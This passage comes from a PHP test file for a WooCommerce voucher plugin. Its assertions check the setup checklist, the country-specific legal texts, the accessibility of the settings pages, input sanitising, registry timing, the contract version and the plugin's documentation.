	json_encode( array( $cp_c_show, $cp_c_dry, $cp_c_apply, $cp_c_all ) )
);

// SET-VC-25: the setup checklist asks for the country profile, the tax type, retention and the mandatory texts.
$GLOBALS['vcap_test_options']    = array( 'woocommerce_default_country' => 'AT' );
$GLOBALS['vcap_test_transients'] = array( 'vcap_redeem_page_guess' => -1 );
$GLOBALS['wpdb']                 = new VCAP_Test_Wpdb();
$c25_open                        = VCAP\Admin\Onboarding::steps();
$GLOBALS['vcap_test_options']['vcap_retention_days'] = '730';
$GLOBALS['vcap_test_options'][ VCAP\CountryProfiles::APPLIED_OPTION ] = array( 'id' => 'AT', 'time' => time(), 'user' => 1 );
$GLOBALS['vcap_test_options']['vcap_default_terms'] = 'Allgemeine Bedingungen';
VCAP\Admin\Onboarding::mark_done( 'vat' );
$c25_done = VCAP\Admin\Onboarding::steps();
check(
	'SET-VC-25: the checklist has the steps country profile (first; button with the profile of the shop\'s country), mandatory texts per country, tax type (link to the tax setting, TAX.md) and retention; each is open on a new shop and done once set (profile applied, conditions, confirmed tax type, retention period)',
	'country_profile' === array_key_first( $c25_open ) && array() === array_diff( array( 'country_profile', 'legal_texts', 'vat', 'retention' ), array_keys( $c25_open ) )
		&& ! $c25_open['country_profile']['done'] && ! $c25_open['legal_texts']['done'] && ! $c25_open['vat']['done'] && ! $c25_open['retention']['done']
		&& 'profile_preview' === $c25_open['country_profile']['action'] && 'Show suggestions for Austria' === $c25_open['country_profile']['button'] && str_contains( $c25_open['vat']['label'], 'TAX.md' ) && str_contains( $c25_open['vat']['url'], '#vcap_mpv_after_tax' ) && str_contains( $c25_open['retention']['url'], '#vcap_retention_days' )
		&& $c25_done['country_profile']['done'] && $c25_done['legal_texts']['done'] && $c25_done['vat']['done'] && $c25_done['retention']['done'],
	json_encode( array( $c25_open, $c25_done ) )
);
$GLOBALS['vcap_test_options'] = array( 'vcap_default_terms' => 'Allgemein', VCAP\Markets::TERMS_OPTION => array( array( 'country' => 'AT', 'language' => '', 'text' => 'Gültig 30 Jahre.' ) ) );
$c25_missing = array(
	'one'     => VCAP\Admin\Onboarding::missing_texts( array( 'DE' ) ),
	'several' => VCAP\Admin\Onboarding::missing_texts( array( 'DE', 'AT', 'CH', 'US' ) ),
	'outside' => VCAP\Admin\Onboarding::missing_texts( array( 'US' ) ),
);
unset( $GLOBALS['vcap_test_options']['vcap_default_terms'] );
$c25_missing['none'] = VCAP\Admin\Onboarding::missing_texts( array( 'US', 'CA' ) );
$c25_missing['at']   = VCAP\Admin\Onboarding::missing_texts( array( 'at' ) );
$c25_onb_src         = (string) file_get_contents( VCAP_PATH . 'src/Admin/Onboarding.php' );
check(
	'SET-VC-25: mandatory texts – general conditions cover one market country; several market countries each need their own conditions (the missing ones are named, countries outside the market data are not); a shop outside the market data needs the general conditions; the button opens the profile preview (nonce, manage_woocommerce)',
	array() === $c25_missing['one'] && array( 'DE', 'CH' ) === $c25_missing['several'] && array() === $c25_missing['outside'] && array( '' ) === $c25_missing['none'] && array() === $c25_missing['at']
		&& str_contains( $c25_onb_src, 'CountryProfilesAdmin::open_preview( \VCAP\CountryProfiles::for_base_country() );' ) && str_contains( $c25_onb_src, "check_admin_referer( 'vcap_onboarding_' . \$do );" ),
	json_encode( $c25_missing )
);
$GLOBALS['wpdb']                 = $cp_saved_wpdb;
$GLOBALS['vcap_test_transients'] = $cp_saved_tr;
$GLOBALS['vcap_test_options']    = $cp_saved;
VCAP\CountryProfiles::reset();

// ---- Group E (test phase fixes): language and settings UI ----
$pv_saved_opts = $GLOBALS['vcap_test_options'];
$pv_set_src    = (string) file_get_contents( VCAP_PATH . 'src/Settings.php' );
$pv_tools_src  = (string) file_get_contents( VCAP_PATH . 'src/Admin/SettingsTools.php' );
$pv_prof_src   = (string) file_get_contents( VCAP_PATH . 'src/Admin/CountryProfilesAdmin.php' );
$pv_submit     = VCAP\Admin\SettingsUi::default_submit();
check(
	'PV-P5-2: every "Vouchers" section starts with a hidden "Save changes" button (name="save", screen-reader-text, not in the Tab order, hidden from screen readers), so Enter in a field saves instead of running the first action button',
	str_starts_with( $pv_submit, '<button type="submit" name="save" value="Save changes"' ) && str_contains( $pv_submit, 'class="screen-reader-text vcap-default-submit"' ) && str_contains( $pv_submit, 'tabindex="-1"' ) && str_contains( $pv_submit, 'aria-hidden="true"' ) && str_contains( $pv_submit, 'onclick="window.onbeforeunload=null;"' )
		&& str_contains( $pv_set_src, '\WC_Admin_Settings::output_fields( array_merge( array( Admin\SettingsUi::default_submit_field() ), $this->fields( (string) $current_section ) ) );' )
		&& str_contains( $pv_set_src, "add_action( 'woocommerce_admin_field_' . Admin\SettingsUi::DEFAULT_SUBMIT_TYPE, array( Admin\SettingsUi::class, 'render_default_submit' ) );" )
		&& VCAP\Admin\SettingsUi::DEFAULT_SUBMIT_TYPE === VCAP\Admin\SettingsUi::default_submit_field()['type'] && false === VCAP\Admin\SettingsUi::default_submit_field()['is_option'],
	$pv_submit
);
$GLOBALS['vcap_test_options'] = array( 'woocommerce_default_country' => 'AT' );
$pv_prev_html = VCAP\Admin\CountryProfilesAdmin::preview_html( 'AT' );
preg_match_all( '/<button\b[^>]*>/', $pv_prev_html, $pv_buttons );
check(
	'PV-P5-2: the action buttons (country profile, import, reset) clear the unsaved-changes prompt on click, and the cells around their controls carry wc-settings-prevent-change-event (WooCommerce ignores changes inside)',
	'wc-settings-prevent-change-event' === VCAP\Admin\SettingsUi::PREVENT_CHANGE && $pv_buttons[0] && count( $pv_buttons[0] ) === count( array_filter( $pv_buttons[0], static fn( $b ) => str_contains( $b, 'onclick="window.onbeforeunload=null;' ) && str_contains( $b, 'formaction=' ) ) )
		&& str_contains( VCAP\Admin\SettingsUi::action_button( 'vcap_settings_reset', 'Reset' ), 'formaction="https://shop.test/wp-admin/admin-post.php?action=vcap_settings_reset" onclick="window.onbeforeunload=null;if(this.dataset.vcapSent){return false;}' )
		&& 1 === substr_count( $pv_tools_src, "<td class=\"forminp ' . esc_attr( SettingsUi::PREVENT_CHANGE ) . '\">" ) && 1 === substr_count( $pv_prof_src, "<td class=\"forminp ' . esc_attr( SettingsUi::PREVENT_CHANGE ) . '\">" )
		&& str_contains( $pv_tools_src, 'return SettingsUi::action_button( $action, $label, $class );' ) && str_contains( $pv_prof_src, 'return SettingsUi::action_button( $action, $label, $class );' )
		&& 0 === preg_match( '/<button type="submit"/', $pv_tools_src . $pv_prof_src ),
	implode( ' ', $pv_buttons[0] )
);
// PV-P5-3: colour, logo and CSS are not dropped silently.
VCAP\SettingsRegistry::reset_flags();
WC_Admin_Settings::$errors    = array();
$GLOBALS['vcap_test_options'] = array( 'vcap_email_color' => '#abcdef', 'vcap_email_logo' => 'https://shop.test/old.png' );
$pv_color = array(
	'hex'   => VCAP\Emails\Branding::save_color( '1F3A4D', array( 'title' => 'Accent colour' ) ),
	'ok'    => VCAP\Emails\Branding::save_color( '#123', array( 'title' => 'Accent colour' ) ),
	'empty' => VCAP\Emails\Branding::save_color( '', array( 'title' => 'Accent colour' ) ),
);
$pv_color_err    = WC_Admin_Settings::$errors;
$pv_color['bad'] = VCAP\Emails\Branding::save_color( 'red', array( 'title' => 'Accent colour' ) );
$pv_logo         = array(
	'bad'   => VCAP\Emails\Branding::save_logo( 'shop.test/logo.png', array( 'title' => 'Logo' ) ),
	'ok'    => VCAP\Emails\Branding::save_logo( 'https://shop.test/new.png', array( 'title' => 'Logo' ) ),
	'empty' => VCAP\Emails\Branding::save_logo( ' ', array( 'title' => 'Logo' ) ),
);
check(
	'PV-P5-3: a colour without "#" is taken with one; another invalid colour or a logo address without http(s) keeps the previous value and names the field in a message; empty still means "WooCommerce default"',
	array( 'hex' => '#1f3a4d', 'ok' => '#123', 'empty' => '', 'bad' => '#abcdef' ) === $pv_color && array() === $pv_color_err && array( 'bad' => 'https://shop.test/old.png', 'ok' => 'https://shop.test/new.png', 'empty' => '' ) === $pv_logo
		&& 2 === count( WC_Admin_Settings::$errors ) && str_starts_with( WC_Admin_Settings::$errors[0], 'Accent colour: "red" is no colour' ) && str_starts_with( WC_Admin_Settings::$errors[1], 'Logo: "shop.test/logo.png" is no web address' )
		&& isset( VCAP\SettingsRegistry::flagged()['vcap_email_color'], VCAP\SettingsRegistry::flagged()['vcap_email_logo'] )
		&& str_contains( (string) file_get_contents( VCAP_PATH . 'src/Emails/Branding.php' ), "array( self::class, 'save_logo' ), 10, 2" ),
	json_encode( array( $pv_color, $pv_logo, WC_Admin_Settings::$errors ) )
);
VCAP\SettingsRegistry::reset_flags();
WC_Admin_Settings::$errors = array();
$pv_css       = array(
	'same'    => VCAP\CustomCss::sanitize_option( 'x', array( 'title' => 'Additional CSS' ), " .a > .b { color: red; }\r\n" ),
	'removed' => VCAP\CustomCss::sanitize_option( 'x', array( 'title' => 'Additional CSS' ), '@import url(x.css); .a { color: red; }' ),
	'long'    => VCAP\CustomCss::sanitize_option( 'x', array( 'title' => 'Additional CSS' ), str_repeat( 'a', VCAP\CustomCss::MAX_LENGTH + 5 ) ),
);
$pv_css_field = array_values( array_filter( ( new VCAP\Settings() )->fields( 'delivery' ), static fn( $f ) => VCAP\CustomCss::OPTION === ( $f['id'] ?? '' ) ) );
check(
	'PV-P5-3: CSS that was shortened or had parts removed is saved with a message naming the field and the change; CSS stored as entered gives none; the textarea has maxlength',
	'.a > .b { color: red; }' === $pv_css['same'] && '.a { color: red; }' === $pv_css['removed'] && VCAP\CustomCss::MAX_LENGTH === mb_strlen( $pv_css['long'] )
		&& 2 === count( WC_Admin_Settings::$errors ) && str_contains( WC_Admin_Settings::$errors[0], 'Additional CSS was saved changed:' ) && str_contains( WC_Admin_Settings::$errors[0], 'not allowed' ) && str_contains( WC_Admin_Settings::$errors[1], 'shortened to 10000 characters' ) && ! str_contains( WC_Admin_Settings::$errors[1], 'not allowed' )
		&& isset( VCAP\SettingsRegistry::flagged()[ VCAP\CustomCss::OPTION ] ) && VCAP\CustomCss::MAX_LENGTH === ( $pv_css_field[0]['custom_attributes']['maxlength'] ?? null ),
	json_encode( WC_Admin_Settings::$errors )
);
// PV-P5-4: a refused or corrected number marks its field; notices after an action are announced.
VCAP\SettingsRegistry::reset_flags();
WC_Admin_Settings::$errors = array();
$pv_n_saved = VCAP\SettingsRegistry::sanitize_option( 'abc', array( 'id' => 'vcap_hold_hours', 'title' => 'Hold hours' ) );
$pv_n_field = VCAP\SettingsRegistry::field( 'vcap_hold_hours', array( 'title' => 'Hold hours', 'type' => 'number', 'desc_tip' => true, 'desc' => 'Help text' ) );
$pv_n_other = VCAP\SettingsRegistry::field( 'vcap_hold_new_customer_above', array( 'title' => 'Other', 'type' => 'number', 'desc' => 'Plain' ) );
VCAP\SettingsRegistry::reset_flags();
$pv_n_after    = VCAP\SettingsRegistry::field( 'vcap_hold_hours', array( 'title' => 'Hold hours', 'type' => 'number' ) );
$pv_err_notice = VCAP\Admin\SettingsUi::notice( array( 'type' => 'error', 'text' => 'Nope' ), 'vcap_settings_notice' );
$pv_ok_notice  = VCAP\Admin\SettingsUi::notice( array( 'type' => 'success', 'text' => 'Done' ), 'vcap_settings_notice' );
check(
	'PV-P5-4: a number that was refused or corrected marks its field on the page after saving (aria-invalid, the message below it; a tooltip-only help stays in the tooltip); other fields stay unmarked',
	null === $pv_n_saved && 1 === count( WC_Admin_Settings::$errors ) && 'true' === ( $pv_n_field['custom_attributes']['aria-invalid'] ?? '' ) && str_starts_with( (string) $pv_n_field['desc'], '<strong class="vcap-field-error">Hold hours: &quot;abc&quot; was not saved' ) && 'Help text' === $pv_n_field['desc_tip'] && 0 === ( $pv_n_field['custom_attributes']['min'] ?? null )
		&& ! isset( $pv_n_other['custom_attributes']['aria-invalid'] ) && 'Plain' === $pv_n_other['desc'] && ! isset( $pv_n_after['custom_attributes']['aria-invalid'] ),
	json_encode( array( $pv_n_field, WC_Admin_Settings::$errors ) )
);
check(
	'PV-P5-4: the message after an action is announced – an error with role="alert", a success with role="status", focusable with an id; a reset without the confirmation marks the checkbox and points at the message',
	str_contains( $pv_err_notice, 'id="vcap_settings_notice" class="notice inline notice-error" role="alert" tabindex="-1"' ) && str_contains( $pv_ok_notice, 'class="notice inline notice-success" role="status"' )
		&& ! str_contains( $pv_tools_src . $pv_prof_src, 'role="status"><p>' ) && str_contains( $pv_tools_src, "__( 'Nothing was reset: please tick the confirmation first.', 'voucher-captain' ), 'vcap_settings_reset_confirm' );" )
		&& str_contains( $pv_tools_src, "' aria-invalid=\"true\" aria-describedby=\"vcap_settings_notice\"'" ) && str_contains( $pv_prof_src, "SettingsUi::notice( \$notice, 'vcap_profile_notice' )" )
);
// PV-P5-5: the command limit fields name their command.
$pv_cmd_titles = array_column( array_filter( VCAP\API\V1\CommandLimits::settings_fields(), static fn( $f ) => 'number' === ( $f['type'] ?? '' ) || 'text' === ( $f['type'] ?? '' ) ), 'title' );
check(
	'PV-P5-5: every limit field of the automatic commands has its own title with the command ("Calls per day (voucher.issue)")',
	count( $pv_cmd_titles ) > 4 && count( $pv_cmd_titles ) === count( array_unique( $pv_cmd_titles ) ) && in_array( 'Calls per day (voucher.issue)', $pv_cmd_titles, true ) && in_array( 'Maximum amount (voucher.issue)', $pv_cmd_titles, true ),
	json_encode( $pv_cmd_titles )
);
// PV-P5-6: preview and change log show field titles and readable values.
$GLOBALS['vcap_test_options'] = $pv_saved_opts;
check(
	'PV-P5-6: the import preview and the change log name a setting by its field title (option name below), show Yes/No for switches and "(empty)" for nothing',
	str_starts_with( VCAP\Admin\SettingsTools::setting_cell( 'vcap_default_terms' ), 'Default redemption conditions<br><code class="description">vcap_default_terms</code>' ) && '<code>vcap_unknown_x</code>' === VCAP\Admin\SettingsTools::setting_cell( 'vcap_unknown_x' )
		&& 'Yes' === VCAP\Admin\SettingsTools::value_text( 'vcap_restore_on_cancel', 'yes' ) && 'No' === VCAP\Admin\SettingsTools::value_text( 'vcap_code_order_ref', 'no' ) && '(empty)' === VCAP\Admin\SettingsTools::value_text( 'vcap_default_terms', '' ) && 'yes' === VCAP\Admin\SettingsTools::value_text( 'vcap_default_terms', 'yes' )
		&& 2 === substr_count( $pv_tools_src, 'self::setting_cell( (string)' ) && ! str_contains( $pv_tools_src, "'<code>' . esc_html( \$key ) . '</code></td>" ),
	json_encode( array_slice( VCAP\Admin\SettingsTools::labels(), 0, 3 ) )
);
check(
	'PV-P5-7: no fixed min-width:400px on the settings page (width:100%;max-width:400px instead); the preview, profile and change-log tables scroll in their own box',
	! str_contains( $pv_set_src, 'min-width:400px' ) && 2 === substr_count( $pv_set_src, 'width:100%;max-width:400px;' ) && 2 === substr_count( $pv_tools_src, 'echo SettingsUi::scroll( $table' ) && str_contains( $pv_prev_html, '<div class="vcap-table-scroll" style="overflow-x:auto;max-width:100%;"><table class="widefat striped">' )
);
check(
	'PV-P5-8: the checklist step "mandatory texts per country" links to the id of the conditions table (its title, rendered by CountryTableField)',
	str_contains( (string) file_get_contents( VCAP_PATH . 'src/Admin/Onboarding.php' ), "'#' . \\VCAP\\Markets::TERMS_OPTION . '-label'" ) && str_contains( (string) file_get_contents( VCAP_PATH . 'src/Admin/CountryTableField.php' ), "<span id=\"' . esc_attr( \$id ) . '-label\">'" )
);
// PV-P2-8: the test email goes to the admin only.
$pv_cc_inside = VCAP\Preview::without_copies( 'vcap_test_mail', static fn() => array( apply_filters( 'woocommerce_email_cc_recipient_vcap_test_mail', 'boss@shop.test' ), apply_filters( 'woocommerce_email_bcc_recipient_vcap_test_mail', 'archive@shop.test' ), apply_filters( 'woocommerce_email_cc_recipient_other', 'x@shop.test' ) ) );
$pv_cc_after  = array( apply_filters( 'woocommerce_email_cc_recipient_vcap_test_mail', 'boss@shop.test' ), apply_filters( 'woocommerce_email_bcc_recipient_vcap_test_mail', 'archive@shop.test' ) );
check(
	'PV-P2-8: while the test email is sent, its Cc and Bcc are empty (other emails untouched); afterwards they are back',
	array( '', '', 'x@shop.test' ) === $pv_cc_inside && array( 'boss@shop.test', 'archive@shop.test' ) === $pv_cc_after && str_contains( (string) file_get_contents( VCAP_PATH . 'src/Preview.php' ), 'self::without_copies( (string) $email->id, static fn() => $email->send( $address, $subject, $email->get_content(), $email->get_headers(), array() ) )' ),
	json_encode( array( $pv_cc_inside, $pv_cc_after ) )
);
$pv_a11y = (string) file_get_contents( VCAP_PATH . 'ACCESSIBILITY.md' );
$pv_rel  = (string) file_get_contents( VCAP_PATH . 'RELEASE_CHECKLIST.md' );
check(
	'PV-P5-10: ACCESSIBILITY.md covers country profile preview, tills table, settings tools and change log; the release checklist has the keyboard / screen reader check of the settings pages',
	str_contains( $pv_a11y, 'Länderprofil' ) && str_contains( $pv_a11y, 'Kassentabelle' ) && str_contains( $pv_a11y, 'Export, Import und Zurücksetzen' ) && str_contains( $pv_a11y, 'Änderungsprotokoll' ) && str_contains( $pv_rel, 'PV-P5-10' )
);
VCAP\SettingsRegistry::reset_flags();
WC_Admin_Settings::$errors    = array();
$GLOBALS['vcap_test_options'] = $pv_saved_opts;
// ---- Test phase fixes, group B (registry timing, performance, contract). ----
// PV-P6-1: add-on entries registered in "vcap_loaded" (after the register was read during boot) count.
$pv61_saved = $GLOBALS['vcap_test_options'];
$GLOBALS['wp_filter'] = array();
VCAP\SettingsRegistry::reset();
$pv61_boot = VCAP\SettingsRegistry::has( 'vcap_pv61_addon' ); // Read during boot (plugins_loaded), cached.
$pv61_cb   = static fn( $s ) => $s + array( 'vcap_pv61_addon' => array( 'type' => 'int', 'default' => 7 ) );
add_filter( 'vcap_settings_registry', $pv61_cb );
$GLOBALS['wp_filter']['vcap_settings_registry'] = (object) array( 'callbacks' => array( 10 => array( 'pv61' => array( 'function' => $pv61_cb, 'accepted_args' => 1 ) ) ) );
$pv61_loaded = VCAP\SettingsRegistry::has( 'vcap_pv61_addon' ) && 7 === VCAP\SettingsRegistry::default( 'vcap_pv61_addon' );
// From "init" on, the register is kept for the request (a later filter needs reset()).
$GLOBALS['vcap_test_did']['init'] = 1;
VCAP\SettingsRegistry::reset();
VCAP\SettingsRegistry::all();
$pv61_cb2 = static fn( $s ) => $s + array( 'vcap_pv61_late' => array( 'default' => 'x' ) );
add_filter( 'vcap_settings_registry', $pv61_cb2 );
$GLOBALS['wp_filter']['vcap_settings_registry']->callbacks[10]['pv61b'] = array( 'function' => $pv61_cb2, 'accepted_args' => 1 );
$pv61_kept = ! VCAP\SettingsRegistry::has( 'vcap_pv61_late' );
VCAP\SettingsRegistry::reset();
$pv61_reset = VCAP\SettingsRegistry::has( 'vcap_pv61_late' );
$pv61_main  = (string) file_get_contents( VCAP_PATH . 'voucher-captain.php' );
check(
	'PV-P6-1: a settings entry an add-on registers in vcap_loaded (after the register was read during boot) is in the register; from "init" on the register is kept for the request; the plugin forgets the register right after vcap_loaded; documented in API.md and FREE-PREMIUM.md',
	! $pv61_boot && $pv61_loaded && $pv61_kept && $pv61_reset
		&& (bool) preg_match( "/do_action\( 'vcap_loaded', \\\$vcap_plugin \);\s*(\/\/[^\n]*\n\s*)?\\\\VCAP\\\\SettingsRegistry::reset\(\);/", $pv61_main )
		&& str_contains( (string) file_get_contents( VCAP_PATH . 'API.md' ), 'forgotten right after this action (PV-P6-1)' ) && str_contains( (string) file_get_contents( VCAP_PATH . 'docs/FREE-PREMIUM.md' ), 'PV-P6-1' ),
	json_encode( array( $pv61_boot, $pv61_loaded, $pv61_kept, $pv61_reset ) )
);
unset( $GLOBALS['wp_filter'], $GLOBALS['vcap_test_did']['init'], $GLOBALS['vcap_test_filters']['vcap_settings_registry'] );
VCAP\SettingsRegistry::reset();
$GLOBALS['vcap_test_options'] = $pv61_saved;

// PV-P6-2: the contract table ends with VCAP_CONTRACT_VERSION and names every 1.3.0 hook of docs/HOOKS.md.
$pv62_main = (string) file_get_contents( VCAP_PATH . 'voucher-captain.php' );
$pv62_conn = (string) file_get_contents( VCAP_PATH . 'CONNECTORS.md' );
preg_match( "/define\( 'VCAP_CONTRACT_VERSION', '(\d+\.\d+\.\d+)' \);/", $pv62_main, $pv62_const );
preg_match_all( '/^\| (1\.\d+\.\d+) \| \d+\.\d+\.\d+ \| (.*) \|$/m', $pv62_conn, $pv62_rows, PREG_SET_ORDER );
$pv62_versions = array_column( $pv62_rows, 1 );
$pv62_last     = (string) end( $pv62_versions );
$pv62_text     = implode( "\n", array_column( $pv62_rows, 2 ) );
preg_match_all( '/^\| `(vcap_[a-z0-9_]+)` \| 1\.3\.0 \|/m', (string) file_get_contents( VCAP_PATH . 'docs/HOOKS.md' ), $pv62_hooks );
$pv62_unnamed = array_values( array_filter( $pv62_hooks[1], static fn( string $hook ) => ! str_contains( $pv62_text, '`' . $hook . '`' ) ) );
check(
	'PV-P6-2: VCAP_CONTRACT_VERSION is 1.8.0 and the last row of the contract table in CONNECTORS.md; every hook marked 1.3.0 in docs/HOOKS.md is named in a contract row; readme.txt and API.md name contract 1.8.0',
	'1.8.0' === ( $pv62_const[1] ?? '' ) && $pv62_last === $pv62_const[1] && array() === $pv62_unnamed && count( $pv62_hooks[1] ) > 15
		&& str_contains( (string) file_get_contents( VCAP_PATH . 'readme.txt' ), 'VCAP_CONTRACT_VERSION 1.8.0' ) && str_contains( (string) file_get_contents( VCAP_PATH . 'API.md' ), "version_compare( VCAP_CONTRACT_VERSION, '1.8.0', '>=' )" ),
	$pv62_last . ' ' . implode( ', ', $pv62_unnamed )
);

// PV-P6-4: the excluded gateways are read on every gateway list – stored autoloaded like the other request settings.
$pv64_saved                   = $GLOBALS['vcap_test_options'];
$GLOBALS['vcap_test_options'] = array();
$pv64_stored                  = VCAP\Settings::store_request_defaults();
check(
	'PV-P6-4: vcap_voucher_excluded_gateways is a request setting; its default (none) is stored autoloaded where nothing is saved, a saved list is kept',
	in_array( VCAP\PaymentMethods::EXCLUDED_OPTION, VCAP\Settings::REQUEST_SETTINGS, true ) && in_array( 'vcap_voucher_excluded_gateways', $pv64_stored, true ) && array() === $GLOBALS['vcap_test_options']['vcap_voucher_excluded_gateways'] && 'yes' === ( $GLOBALS['vcap_test_autoload']['vcap_voucher_excluded_gateways'] ?? null ),
	json_encode( $pv64_stored )
);
$GLOBALS['vcap_test_options'] = $pv64_saved;

// PV-P6-5: the country select is built once per request; only the selection changes per row.
VCAP\Admin\CountryTableField::reset_options();
$pv65_m    = new ReflectionMethod( VCAP\Admin\CountryTableField::class, 'country_options' );
$pv65_none = (string) $pv65_m->invoke( null, '' );
$pv65_memo = ( new ReflectionProperty( VCAP\Admin\CountryTableField::class, 'country_options' ) )->getValue();
$pv65_at   = (string) $pv65_m->invoke( null, 'AT' );
$pv65_zz   = (string) $pv65_m->invoke( null, 'ZZ' );
check(
	'PV-P6-5: the options of the country select are built once and memoised; a row selects exactly its country; a stored code outside the list stays selectable',
	is_string( $pv65_memo ) && $pv65_memo === $pv65_none && 0 === substr_count( $pv65_none, 'selected=' ) && 1 === substr_count( $pv65_at, 'selected=' ) && str_contains( $pv65_at, '<option value="AT" selected="selected">' ) && strlen( $pv65_at ) === strlen( $pv65_none ) + strlen( ' selected="selected"' )
		&& str_ends_with( $pv65_zz, '<option value="ZZ" selected="selected">ZZ</option>' ) && 1 === substr_count( $pv65_zz, 'selected=' ),
	substr( $pv65_at, 0, 200 )
);
VCAP\Admin\CountryTableField::reset_options();

// PV-P6-6: uninstalling with data removal deletes the user setting "Hide hints on extensions".
$pv66_un = (string) file_get_contents( VCAP_PATH . 'uninstall.php' );
check(
	'PV-P6-6: vcap_uninstall_user_meta() removes the user meta of the hint lines (ProHints::USER_META)',
	'vcap_hide_pro_hints' === VCAP\Admin\ProHints::USER_META && (bool) preg_match( "/function vcap_uninstall_user_meta\(\): void \{[^}]*'vcap_hide_pro_hints'/", $pv66_un )
);

// PV-P6-7: the excluded gateways filter is in the extension point table of API.md.
check( 'PV-P6-7: API.md → "Extension points for add-ons" lists vcap_voucher_excluded_gateways with version 1.3.0', str_contains( (string) file_get_contents( VCAP_PATH . 'API.md' ), '| `vcap_voucher_excluded_gateways` | filter |' ) );

// PV-P2-10: the default validity in days has a ceiling of 100 years, also the product field.
$pv210_reg = VCAP\SettingsRegistry::get( 'vcap_default_expiry_days' );
check(
	'PV-P2-10: vcap_default_expiry_days has max 36500 (saving 9999999 stores 36500); "Valid for (days)" of a product is capped the same way',
	36500 === ( $pv210_reg['max'] ?? null ) && 36500 === (int) VCAP\SettingsRegistry::sanitize_option( '9999999', array( 'id' => 'vcap_default_expiry_days' ) )
		&& 36500 === VCAP\ProductSettings::expiry_days( '9999999' ) && 30 === VCAP\ProductSettings::expiry_days( '30' ) && '' === VCAP\ProductSettings::expiry_days( '' ) && 36500 === VCAP\ProductSettings::MAX_EXPIRY_DAYS,
	json_encode( array( $pv210_reg['max'] ?? null, VCAP\SettingsRegistry::sanitize_option( '9999999', array( 'id' => 'vcap_default_expiry_days' ) ) ) )
);

// PV-P2-11: Settings::DEFAULTS is back as a deprecated constant with the 65 defaults of 1.2.0 (equal to the register,
// except the two country texts, which were strings in 1.2.0 and are tables since SET-VC-04 – both read '' as "none").
$pv211_diff = array();
foreach ( VCAP\Settings::DEFAULTS as $pv211_key => $pv211_value ) {
	$pv211_table = in_array( $pv211_key, array( 'vcap_terms_by_country', 'vcap_expiry_by_country' ), true ) && '' === $pv211_value && array() === VCAP\SettingsRegistry::default( $pv211_key );
	if ( ! $pv211_table && ( ! VCAP\SettingsRegistry::has( $pv211_key ) || VCAP\SettingsRegistry::default( $pv211_key ) !== $pv211_value ) ) {
		$pv211_diff[ $pv211_key ] = array( $pv211_value, VCAP\SettingsRegistry::default( $pv211_key ) );
	}
}
check(
	'PV-P2-11: Settings::DEFAULTS exists again (@deprecated 1.3.0, 65 options of 1.2.0) and each value equals the register default (the country texts: 1.2.0 string \'\', now an empty table)',
	65 === count( VCAP\Settings::DEFAULTS ) && array() === $pv211_diff && str_contains( (string) file_get_contents( VCAP_PATH . 'src/Settings.php' ), '@deprecated 1.3.0 Use Settings::defaults()' ),
	json_encode( $pv211_diff )
);

// PV-P3-7: LEGAL_TEXTS.md describes the country tables (with the language column of the conditions), lists the
// suggestions of the country profiles (CH 10 years Art. 127 OR, retention 1095 days, receipt duty) and the retention
// periods, all unchecked; the generator still reports it up to date.
$pv37_md  = (string) file_get_contents( VCAP_PATH . 'LEGAL_TEXTS.md' );
$pv37_out = array();
$pv37_rc  = 1;
exec( escapeshellarg( PHP_BINARY ) . ' ' . escapeshellarg( VCAP_PATH . 'bin/legal-texts.php' ) . ' --check 2>&1', $pv37_out, $pv37_rc );
check(
	'PV-P3-7: LEGAL_TEXTS.md shows the table format with the language column, the country profile suggestions (CH Art. 127 OR, 1095 days, receipt number) and the retention block (unchecked); bin/legal-texts.php --check passes',
	0 === $pv37_rc && str_contains( $pv37_md, '**Land**, **Sprache**' ) && str_contains( $pv37_md, '## 3. Vorschläge der Länderprofile' ) && str_contains( $pv37_md, 'Art. 127 OR' ) && str_contains( $pv37_md, '1095 Tage' )
		&& str_contains( $pv37_md, 'Pflicht (Länderdaten `fiscal_receipt`)' ) && str_contains( $pv37_md, '## 4. Aufbewahrungsfristen' ) && str_contains( $pv37_md, '| `vcap_retention_days` |' ) && str_contains( $pv37_md, '☐ nicht geprüft' ) && ! str_contains( $pv37_md, '(`AT: …`)' ),
	implode( ' ', $pv37_out )
);

// PV-P3-8: TAX.md covers CH/LI/GB/NO, the tax hints of the country profiles, the effect of reset/import on
// vcap_mpv_after_tax and voucher.issue (paid = false, row 2.8) – open points phrased as "zu prüfen".
$pv38_tax = (string) file_get_contents( VCAP_PATH . 'TAX.md' );
check(
	'PV-P3-8: TAX.md has the sections non-EU countries (CH, LI, GB, NO), tax hints of the country profiles, reset/import effect on vcap_mpv_after_tax and voucher.issue issuing paid = false (row 2.8), without deciding the tax questions',
	str_contains( $pv38_tax, '### 8.1 Länder außerhalb der EU' ) && str_contains( $pv38_tax, '| LI | ☐ |' ) && str_contains( $pv38_tax, '| NO | ☐ |' ) && str_contains( $pv38_tax, '### 8.2 Steuerhinweise der Länderprofile' )
		&& str_contains( $pv38_tax, '**Zurücksetzen, Import und Länderprofil wirken auf diese Einstellung**' ) && str_contains( $pv38_tax, '`voucher.issue`' ) && str_contains( $pv38_tax, '(`paid => false`' ) && str_contains( $pv38_tax, 'Zeile 2.8' ) && substr_count( $pv38_tax, 'zu prüfen' ) >= 5
);
// Test phase fixes, group C (PV-P3-2 … PV-P2-9).
echo "PV group C fixes\n";
$pvc_saved    = $GLOBALS['vcap_test_options'];
$pvc_saved_tr = $GLOBALS['vcap_test_transients'] ?? array();
// PV-P3-2: a shop with own days but no saved rule (effective "days") – the rule is its own value, not ticked.
$GLOBALS['vcap_test_options'] = array( 'woocommerce_default_country' => 'DE', 'vcap_default_expiry_days' => '365' );
VCAP\CountryProfiles::reset();
$pvc_days = VCAP\CountryProfiles::preview( 'DE' )['vcap_default_expiry_rule'];
$GLOBALS['vcap_test_options'] = array( 'woocommerce_default_country' => 'DE' );
$pvc_new = VCAP\CountryProfiles::preview( 'DE' )['vcap_default_expiry_rule'];
check(
	'PV-P3-2: the country profile does not tick the statutory validity rule for a shop that saved its own number of days but never the rule (rule "days" applies: own value, shown, not ticked); a new shop without days has nothing to change',
	'days' === ( static function () {
		$GLOBALS['vcap_test_options']['vcap_default_expiry_days'] = '365';
		$rule = VCAP\ProductConfig::default_expiry_rule();
		unset( $GLOBALS['vcap_test_options']['vcap_default_expiry_days'] );
		return $rule;
	} )() && $pvc_days['changed'] && $pvc_days['own'] && ! $pvc_days['preselected'] && 'statutory' === $pvc_days['value']
		&& ! $pvc_new['changed'] && ! $pvc_new['own'],
	wp_json_encode( array( $pvc_days, $pvc_new ) )
);
